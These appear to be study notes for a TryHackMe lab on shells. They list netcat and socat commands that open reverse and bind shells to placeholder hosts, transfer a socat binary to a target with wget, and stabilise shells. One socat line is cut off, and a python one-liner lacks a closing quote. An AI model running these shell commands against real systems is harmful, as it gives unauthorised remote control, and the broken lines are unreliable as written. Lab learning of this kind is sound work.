# Room
https://tryhackme.com/room/introtoshells

# Task 1 - What is a shell?
## Shell Programs
* Linux: sh, bash
* Windows: cmd, powershell
## Shell Types
* Reverse - target connects back to you
* Bind - target opens a port for you to connect to it

# Task 2 - Tools
* netcat - used for reverse and bind shells
* socat - more powerful version of netcat, stable
* metasploit multi/handler - reverse and bind shells, meterpreter shell, payload staging
* msfvenom - create payloads for reverse and bind shells

# Task 3 - Types of Shell
* Reverse - target connects back to your listener
    * Local: sudo nc -nvlp 8888
    * Remote: nc [local_ip] 8888 -e /bin/bash
* Bind - target opens a port for you to connect to
    * Remote: sudo nc -nvlp 8888 -e /bin/bash
    * Local: nc [remote_ip] 8888
* Interactive VS Non-Interactive shells - Interactive shells are the standard experience you are used to when using bash or powershell, you can run all commands, etc.  Non-Interactive shells only allow you to run commands successfully that do not require input, such as ls or dir, commands that require input would not work, such as sudo -l

# Task 4 - Netcat
## Reverse Shell
* sudo nc -nvlp [local_port]
    * -n - don't resolve with DNS
    * -v - verbose
    * -l - create a listener
    * -p - use the following port
    * [local_port] - the port for incoming connections
## Bind Shell
* nc [remote_ip] [remote_port]
    * [remote_ip] - IP that has a listener
    * [remote_port] - port open on the listener

# Task 5 - Netcat Shell Stabalization
Netcat shells aren't stable and are non-interactive by default
* Stabilize with Python
    * upgrade to bash - python -c 'import pty;pty.spawn("/bin/bash")
    * upgrade to term commands - export TERM=xterm
    * upgrade to autocomplete, etc - CTRL+Z, stty raw -echo; fg
    * if the shell dies, type reset and then enter
* Stabilize with rlwrap
    * install first - sudo apt install rlwrap
    * to use - sudo rlwrap nc -nvlp [local_port]
* Stabilize with Socat
    * use netcat to get an initial shell
    * host socat - sudo python3 -m http.server 80
    * transfer socat - wget http://[remote_ip]/socat -O /tmp/socat
    * go through socat setup process to upgrade to that shell
* Change terminal tty size
    * make note of rows and columns - stty -a
    * update rows using number above - stty rows [number]
    * update columns using number above - stty cols [number]
    * changing these values allow text editors and other tools to display properly

# Task 6 - Socat
Provides a link between two points
## Reverse Shell
* Local: socat TCP-L:[local_port]
* Remote (Windows): socat TCP:[local_ip]:[local_port] EXEC:powershell.exe,pipes
    * pipes forces powershell to use Unix standard IO
* Remote (Linux): socat TCP:[local_ip]:[local_port] EXEC:"
## Bind Shell
* Remote (Linux): socat TCP-L:[remote_port] EXEC:"bash -li"
* Remote (Windows): socat TCP-L:[remote_port] EXEC:powershell.exe,pipes
* Local: socat TCP:[remote_ip]:[remote_port] -
## Stable Reverse Shell
* Local: socat TCP-L:[local] FILE:\`tty`,raw,echo=0
* Remote: socat TCP:[local_ip]:[local_port] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
* This shell only works when the target is using Linux